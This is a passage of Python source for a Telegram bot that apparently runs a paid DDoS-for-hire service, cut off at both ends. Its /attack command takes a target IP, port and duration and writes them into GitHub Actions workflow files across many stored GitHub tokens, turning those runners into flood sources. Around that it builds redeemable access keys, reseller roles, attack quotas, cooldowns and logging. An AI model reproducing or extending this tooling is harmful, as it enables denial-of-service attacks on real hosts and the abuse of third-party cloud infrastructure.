        f"🆔 **ʏᴏᴜʀ ᴜsᴇʀ ɪᴅᴇɴᴛɪғɪᴄᴀᴛɪᴏɴ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n"
        f"• **ᴜsᴇʀɴᴀᴍᴇ:** @{username}\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        reply_markup=get_user_keyboard()
    )

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id):
        role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ" if is_primary_owner(user_id) else "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "🛡️ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💰 ʀᴇsᴇʟʟᴇʀ"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', 'LIFETIME')
    elif is_approved_user(user_id):
        role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "ᴇxᴘɪʀᴇᴅ"
                else:
                    expiry = time.strftime("%Y-%m-%d %H:%M", time.localtime(expiry_time))
            except:
                pass
    else:
        role = f"<tg-emoji emoji-id='5399850755337240950'>⏳</tg-emoji> ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ / ᴋᴇʏ"
    
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    attack_access_label = f"<tg-emoji emoji-id='5206607081334906820'>✔️</tg-emoji> ʏᴇs" if can_user_attack(user_id) else f"<tg-emoji emoji-id='5210952531676504517'>😀</tg-emoji> ɴᴏ"
    
    await update.message.reply_text(
        f"<tg-emoji emoji-id='5296369303661067030'>🔒</tg-emoji> <b>ʏᴏᴜʀ ᴀᴄᴄᴇss ɪɴғᴏ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• <b>ʀᴏʟᴇ:</b> {role}\n"
        f"• <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>\n"
        f"• <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{update.effective_user.username or 'ɴᴏ ᴜsᴇʀɴᴀᴍᴇ'}\n"
        f"• <b>ᴇxᴘɪʀʏ:</b> {expiry}\n"
        f"• <b>ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:</b> <code>{remaining_attacks}/{MAX_ATTACKS}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>ᴀᴛᴛᴀᴄᴋ ᴀᴄᴄᴇss:</b> {attack_access_label}",
        reply_markup=get_user_keyboard(),
        parse_mode="HTML"
    )

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, ip: str, port: str, time_val: str):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴛᴛᴀᴄᴋ.\n"
            "Use <tg-emoji emoji-id='6311935044017461530'>🔑</tg-emoji> <b>Redeem Key</b> or contact Admin.",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message, reply_markup=get_user_keyboard())
        return
    
    if not github_tokens:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ. ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ.",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    if not is_valid_ip(ip):
        await update.message.reply_text(
            "⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '15' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ.",
            reply_markup=get_user_keyboard()
        )
        return
    
    method, method_name = get_attack_method(ip)
    if method is None:
        await update.message.reply_text(
            f"⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n━━━━━━━━━━━━━━━━━━━━━━\n{method_name}",
            reply_markup=get_user_keyboard()
        )
        return
    
    try:
        attack_duration = int(time_val)
        if attack_duration <= 0:
            await update.message.reply_text("❌ Time must be a positive number", reply_markup=get_user_keyboard())
            return
        if attack_duration > MAX_ATTACK_DURATION:
            if not is_owner(user_id) and not is_admin(user_id):
                await update.message.reply_text(
                    f"❌ **ᴀᴛᴛᴀᴄᴋ ᴅᴜʀᴀᴛɪᴏɴ ʟɪᴍɪᴛ**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Maximum allowed attack time is `{MAX_ATTACK_DURATION}` seconds.",
                    reply_markup=get_user_keyboard()
                )
                return
    except ValueError:
        await update.message.reply_text("❌ Time must be a number", reply_markup=get_user_keyboard())
        return
    
    if int(port) in blocked_ports:
        await update.message.reply_text(
            f"❌ <b>ɢᴀʟᴀᴛ ᴘᴏʀᴛ ʜᴀɪ</b>\n━━━━━━━━━━━━━━━━━━━━━━\nPort <code>{port}</code> is blocked.",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    attack_obj = start_attack(ip, port, time_val, user_id, method)
    progress_msg = await update.message.reply_text(
        f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> <b>sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ...</b>",
        parse_mode="HTML"
    )
    
    success_count = 0
    fail_count = 0
    threads = []
    results = []
    
    def update_single_token(token_data):
        try:
            result = update_yml_file(
                token_data['token'], token_data['repo'], ip, port, time_val, method
            )
            results.append((token_data['username'], result))
        except Exception:
            results.append((token_data['username'], False))
    
    for token_data in github_tokens:
        thread = threading.Thread(target=update_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, success in results:
        if success:
            success_count += 1
        else:
            fail_count += 1
    
    user_id_str = str(user_id)
    remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
    
    message = (
        f"<tg-emoji emoji-id='6017356590238143173'>🎯</tg-emoji> <b>ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5447410659077661506'>🌐</tg-emoji> ᴛᴀʀɢᴇᴛ: <code>{ip}</code>\n"
        f"<tg-emoji emoji-id='5330237710655306682'>🚪</tg-emoji> ᴘᴏʀᴛ: <code>{port}</code>\n"
        f"<tg-emoji emoji-id='5258113901106580375'>⏱️</tg-emoji> ᴛɪᴍᴇ: <code>{time_val}s</code>\n"
        f"<tg-emoji emoji-id='5352858062157783478'>🖥️</tg-emoji> sᴇʀᴠᴇʀs: <code>{success_count}</code>\n"
        f"<tg-emoji emoji-id='5967507030842283316'>⚡</tg-emoji> ᴍᴇᴛʜᴏᴅ: <code>{method_name}</code>\n"
        f"<tg-emoji emoji-id='5375338737028841420'>⏳</tg-emoji> ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s ᴀғᴛᴇʀ ᴀᴛᴛᴀᴄᴋ\n"
        f"<tg-emoji emoji-id='6314558216768329781'>🎯</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs: <code>{remaining_attacks}/{MAX_ATTACKS}</code>"
    )
    await progress_msg.edit_text(message, parse_mode="HTML")
    
    # Logging system to log gc
    log_chat_id = load_log_channel()
    if log_chat_id:
        try:
            user = update.effective_user
            user_name = user.full_name or user.first_name or "Unknown User"
            user_id = user.id
            username = user.username
            
            if username:
                user_mention = f"@{username}"
            else:
                user_mention = f"<a href='tg://user?id={user_id}'>{user_name}</a>"
                
            log_text = (
                f"🚨 <b>ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>ᴜsᴇʀ:</b> {user_mention}\n"
                f"🆔 <b>ᴜsᴇʀ ɪᴅ:</b> <a href='tg://user?id={user_id}'>{user_id}</a>\n"
                f"🌐 <b>ᴛᴀʀɢᴇᴛ ɪᴘ:</b> <code>{ip}</code>\n"
                f"🚪 <b>ᴘᴏʀᴛ:</b> <code>{port}</code>\n"
                f"⏱️ <b>ᴛɪᴍᴇ:</b> <code>{time_val}s</code>\n"
                f"⚡ <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{method_name}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            await context.bot.send_message(chat_id=log_chat_id, text=log_text, parse_mode="HTML")
        except Exception as le:
            logger.error(f"Error sending log to channel {log_chat_id}: {le}")

    def monitor_attack_completion():
        time.sleep(attack_duration)
        finish_attack(attack_obj)
        logger.info(f"Attack completed automatically after {attack_duration} seconds. Cooldown started ({COOLDOWN_DURATION}s).")
    
    monitor_thread = threading.Thread(target=monitor_attack_completion)
    monitor_thread.daemon = True
    monitor_thread.start()

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴛᴛᴀᴄᴋ.\n"
            "Use <tg-emoji emoji-id='6311935044017461530'>🔑</tg-emoji> <b>Redeem Key</b> or contact Admin.",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message, reply_markup=get_user_keyboard())
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5258274739041883702'>❌</tg-emoji> <b>ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴀɢᴇ: <code>/attack &lt;ɪᴘ&gt; &lt;ᴘᴏʀᴛ&gt; &lt;ᴛɪᴍᴇ&gt;</code>\n\n"
            "ᴇxᴀᴍᴘʟᴇ: <code>/attack 1.1.1.1 80 60</code>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    ip, port, time_val = context.args
    await run_attack(update, context, ip, port, time_val)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
        
    today_str = time.strftime("%Y-%m-%d")
    total_tracked_users = db["all_bot_users"].count_documents({})
    today_new_users = db["all_bot_users"].count_documents({"joined_date": today_str})
    
    stat_doc = db["daily_attack_stats"].find_one({"_id": today_str})
    today_attacks = stat_doc.get("count", 0) if stat_doc else 0
    total_approved = len(approved_users)
    
    stats_text = (
        f"<tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> <b>ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs &amp; ᴀɴᴀʟʏᴛɪᴄs</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• 👥 Total Bot Users: <code>{total_tracked_users}</code>\n"
        f"• 🆕 New Users Today: <code>{today_new_users}</code>\n"
        f"• ⚡ Attacks Today: <code>{today_attacks}</code>\n"
        f"• 👤 Active Approved Users: <code>{total_approved}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(stats_text, reply_markup=get_user_keyboard(), parse_mode="HTML")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    attack_status = get_attack_status()
    if attack_status["status"] == "running":
        running_items = attack_status["active_attacks"]
        msg_lines = [
            f"<tg-emoji emoji-id='6311888443622299860'>✔️</tg-emoji> <b>ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ({attack_status['count']}/{MAX_CONCURRENT_ATTACKS})</b>\n━━━━━━━━━━━━━━━━━━━━━━"
        ]
        for idx, item in enumerate(running_items, 1):
            att = item["attack"]
            msg_lines.append(
                f"<b>Attack #{idx}</b>\n"
                f"<tg-emoji emoji-id='5447410659077661506'>🌐</tg-emoji> ᴛᴀʀɢᴇᴛ: <code>{att['ip']}:{att['port']}</code>\n"
                f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ᴇʟᴀᴘsᴇᴅ: <code>{item['elapsed']}s</code> | <tg-emoji emoji-id='6314480001118902592'>⏱️</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{item['remaining']}s</code>\n"
                f"<tg-emoji emoji-id='5967507030842283316'>⚡</tg-emoji> ᴍᴇᴛʜᴏᴅ: <code>{att['method']}</code>"
            )
        message = "\n\n".join(msg_lines)
    elif attack_status["status"] == "cooldown":
        message = (
            f"<tg-emoji emoji-id='5258113901106580375'>⏱️</tg-emoji> <b>ᴄᴏᴏʟᴅᴏᴡɴ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<tg-emoji emoji-id='5258113901106580375'>⏱️</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{attack_status['remaining_cooldown']}s</code>\n"
            f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ɪɴ: <code>{attack_status['remaining_cooldown']}s</code>"
        )
    else:
        message = (
            f"<tg-emoji emoji-id='5208748315805499400'>✅</tg-emoji> <b>ʀᴇᴀᴅʏ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ.\n"
            "ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
        )
    await update.message.reply_text(message, reply_markup=get_user_keyboard(), parse_mode="HTML")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**", reply_markup=get_user_keyboard())
        return
    
    attack_status = get_attack_status()
    if attack_status["status"] != "running":
        await update.message.reply_text("❌ **ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ**", reply_markup=get_user_keyboard())
        return
    
    if not github_tokens:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ</b>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    progress_msg = await update.message.reply_text("🛑 **sᴛᴏᴘᴘɪɴɢ ᴀᴛᴛᴀᴄᴋs...**")
    
    total_stopped = 0
    success_count = 0
    threads = []
    results = []
    
    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            results.append((token_data['username'], stopped))
        except Exception:
            results.append((token_data['username'], 0))
    
    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1
    
    stop_attack(user_id if not is_owner(user_id) else None)
    
    message = (
        f"🛑 **ᴀᴛᴛᴀᴄᴋ sᴛᴏᴘᴘᴇᴅ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ ᴡᴏʀᴋғʟᴏws ᴄᴀɴᴄᴇʟʟᴇᴅ: {total_stopped}\n"
        f"✅ sᴇʀᴠᴇʀs: {success_count}/{len(github_tokens)}\n"
        f"⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s"
    )
    await progress_msg.edit_text(message)

async def addapk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **Access Denied.**")
        return
    
    document = update.message.document
    caption = update.message.caption or ""
    
    reply_to = update.message.reply_to_message
    if not document and reply_to and reply_to.document:
        document = reply_to.document
        caption = update.message.text or ""
    
    if not document:
        await update.message.reply_text(
            "❌ **Please upload an APK file with caption `/addapk <instructions>` or reply to an APK file with `/addapk <instructions>`**"
        )
        return
    
    description = ""
    if caption:
        parts = caption.split(maxsplit=1)
        if len(parts) > 1:
            description = parts[1]
        elif not caption.startswith("/addapk"):
            description = caption
            
    db["canary_apk"].update_one(
        {"_id": "latest"},
        {"$set": {"file_id": document.file_id, "description": description}},
        upsert=True
    )
    await update.message.reply_text("✅ **Canary APK and instructions added successfully!**")

async def setvideo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **Access Denied.**")
        return
    
    video = update.message.video
    reply_to = update.message.reply_to_message
    if not video and reply_to and reply_to.video:
        video = reply_to.video
        
    if not video:
        await update.message.reply_text(
            "❌ **Please upload a video with caption `/setvideo` or reply to a video with `/setvideo`**"
        )
        return
        
    db["how_to_use"].update_one(
        {"_id": "latest"},
        {"$set": {"file_id": video.file_id}},
        upsert=True
    )
    await update.message.reply_text("✅ **How to use video set successfully!**")

# Key Generation & Redemption Commands (Admin Panel)

async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ: Admins only.**")
        return
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "🔑 **ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Usage: `/genkey <key_name> <max_users> <duration>`\n\n"
            "• `<key_name>`: Custom key name or `auto` for random key\n"
            "• `<max_users>`: Number of users allowed (0 for unlimited)\n"
            "• `<duration>`: Duration (e.g., `1h`, `24h`, `7d`, `30d`, `lifetime` or `0`)\n\n"
            "Examples:\n"
            "• `/genkey MYKEY123 1 24h`\n"
            "• `/genkey VIPPASS 10 7d`\n"
            "• `/genkey auto 5 30d`\n"
            "• `/genkey ULTRA 0 lifetime`"
        )
        return
    
    key_name = context.args[0]
    try:
        max_users = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ `max_users` must be a number!")
        return
    
    duration_str = context.args[2]
    
    final_key_name, dur_type, dur_val = create_custom_key(key_name, max_users, duration_str, user_id)
    
    users_label = "Unlimited" if max_users == 0 else f"{max_users} user(s)"
    dur_label = "Lifetime" if dur_type == "LIFETIME" else f"{dur_val} {dur_type.lower()}"
    
    await update.message.reply_text(
        f"✅ **ᴋᴇʏ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **Key:** `{final_key_name}`\n"
        f"👥 **Max Users:** {users_label}\n"
        f"⏱️ **Duration:** {dur_label}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Users can redeem with:\n`/redeem {final_key_name}`"
    )

async def gentrailkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    hours_str = context.args[0] if context.args else "24"
    final_key_name, dur_type, dur_val = create_custom_key("auto", 1, f"{hours_str}h", user_id)
    
    await update.message.reply_text(
        f"🔑 **ᴛʀɪᴀʟ ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Key: `{final_key_name}`\n"
        f"Duration: {hours_str} Hours\n\n"
        f"Redeem with:\n`/redeem {final_key_name}`"
    )

async def keyslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not keys_db:
        await update.message.reply_text("📭 No keys generated yet.")
        return
    
    text = "🔑 **ɢᴇɴᴇʀᴀᴛᴇᴅ ᴋᴇʏs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\n"
    count = 1
    for k_name, k_info in keys_db.items():
        max_u = k_info.get("max_users", 1)
        used_c = k_info.get("used_count", 0)
        dur_t = k_info.get("duration_type", "HOURS")
        dur_v = k_info.get("duration_value", 0)
        dur_l = "Lifetime" if dur_t == "LIFETIME" else f"{dur_v} {dur_t.lower()}"
        users_l = "Unlimited" if max_u == 0 else f"{used_c}/{max_u}"
        text += f"{count}. `{k_name}` | Uses: {users_l} | Duration: {dur_l}\n"
        count += 1
    
    await update.message.reply_text(text)

async def delkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/delkey <key_name>`")
        return
    
    k_name = context.args[0]
    if k_name in keys_db:
        del keys_db[k_name]
        save_keys(keys_db)
        await update.message.reply_text(f"✅ Key `{k_name}` deleted.")
    else:
        await update.message.reply_text(f"❌ Key `{k_name}` not found.")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5258274739041883702'>❌</tg-emoji> <b>ɪɴᴠᴀʟɪᴅ sʏɴᴛᴀx</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Usage: <code>/redeem &lt;KEY&gt;</code>\n"
            "Example: <code>/redeem MYKEY123</code>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    key_input = context.args[0].strip()
    success, message = redeem_key_func(key_input, user_id)
    await update.message.reply_text(message, reply_markup=get_user_keyboard(), parse_mode="HTML")

# Cooldown Command
async def setcooldown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Usage: `/setcooldown <seconds>`")
        return
    
    try:
        new_cooldown = int(context.args[0])
        if new_cooldown < 0:
            await update.message.reply_text("❌ Cooldown cannot be negative")
            return
        
        global COOLDOWN_DURATION
        COOLDOWN_DURATION = new_cooldown
        save_cooldown(new_cooldown)
        
        await update.message.reply_text(
            f"✅ **ᴄᴏᴏʟᴅᴏᴡɴ ᴜᴘᴅᴀᴛᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"New Cooldown: `{COOLDOWN_DURATION}` seconds after each attack."
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

# Other Admin Commands
async def removexpiredtoken_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    valid_tokens = []
    expired_tokens = []
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            user = g.get_user()
            _ = user.login
            valid_tokens.append(token_data)
        except Exception:
            expired_tokens.append(token_data)
    
    if not expired_tokens:
        await update.message.reply_text("✅ All tokens are valid.")
        return
    
    github_tokens.clear()
    github_tokens.extend(valid_tokens)
    save_github_tokens(github_tokens)
    await update.message.reply_text(f"🗑️ Removed {len(expired_tokens)} expired tokens. Valid tokens: {len(valid_tokens)}")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/remove <user_id>`")
        return
    
    try:
        user_to_remove = int(context.args[0])
        user_to_remove_str = str(user_to_remove)
        removed = False
        
        if user_to_remove_str in approved_users:
            del approved_users[user_to_remove_str]
            save_approved_users(approved_users)
            removed = True
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
        save_pending_users(pending_users)
        
        if user_to_remove_str in user_attack_counts:
            del user_attack_counts[user_to_remove_str]
            save_user_attack_counts(user_attack_counts)
        
        if removed:
            await update.message.reply_text(f"✅ User `{user_to_remove}` access removed.")
        else:
            await update.message.reply_text(f"❌ User `{user_to_remove}` not found.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def setmaxattack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/setmaxattack <number>`")
        return
    
    try:
        max_attacks = int(context.args[0])
        if max_attacks < 1:
            await update.message.reply_text("❌ Must be at least 1")
            return
        
        global MAX_ATTACKS
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)
        await update.message.reply_text(f"✅ Max attacks set to `{MAX_ATTACKS}` per user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid number")

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/block <port>`\nExample: `/block 1000`", parse_mode="HTML")
        return
    
    try:
        port_num = int(context.args[0])
        blocked_ports.add(port_num)
        save_blocked_ports(blocked_ports)
        await update.message.reply_text(f"✅ Port <code>{port_num}</code> blocked successfully! All fixed.", parse_mode="HTML")
    except ValueError:
        await update.message.reply_text("❌ Invalid port number.")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: `/unblock <port>`", parse_mode="HTML")
        return
    
    try:
        port_num = int(context.args[0])
        if port_num in blocked_ports:
            blocked_ports.remove(port_num)
            save_blocked_ports(blocked_ports)
            await update.message.reply_text(f"✅ Port <code>{port_num}</code> unblocked successfully!", parse_mode="HTML")
        else:
            await update.message.reply_text(f"⚠️ Port <code>{port_num}</code> is not in blocked list.", parse_mode="HTML")
    except ValueError:
        await update.message.reply_text("❌ Invalid port number.")

async def listblocks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not blocked_ports:
        await update.message.reply_text("🚫 No ports are currently blocked.")
        return
    
    ports_str = ", ".join(f"<code>{p}</code>" for p in sorted(blocked_ports))
    await update.message.reply_text(f"🚫 <b>Blocked Ports List:</b>\n{ports_str}", parse_mode="HTML")

async def setconcurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
    
    if not context.args:
